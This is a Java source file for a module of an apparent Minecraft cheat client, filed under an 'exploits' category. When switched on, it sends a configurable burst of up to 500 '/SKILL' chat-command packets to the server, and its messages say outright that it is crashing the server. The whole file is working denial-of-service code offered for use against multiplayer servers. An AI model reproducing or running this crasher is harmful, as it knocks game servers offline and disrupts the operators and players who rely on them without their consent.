package it.thatskai.aragosta.module.exploits;

import it.thatskai.aragosta.AragostaMain;
import it.thatskai.aragosta.annotations.modules.IModule;
import it.thatskai.aragosta.annotations.modules.Module;
import it.thatskai.aragosta.module.Category;
import it.thatskai.aragosta.settings.Setting;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

import static it.thatskai.aragosta.utils.MessageUtils.sendMessage;

@IModule(
        name = "Skill",
        key = 0,
        category = Category.EXPLOITS
)
public class SkillModule extends Module {
    public void setup(){
        AragostaMain.instance.settingsManager.rSetting(new Setting(getName(), this, 50, 10, 500, true));
    }
    public void onEnable() {
        int packets = (int) AragostaMain.instance.settingsManager.getSettingByName(getName()).getValDouble();
        sendMessage("Mandando " + packets + " pacchetti con l'exploit "+getName(), true);
        for (int i = 0; i < packets; i++) {
            Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/SKILL"));
        }
        sendMessage("&7Crashing..", false);toggle();

    }
}
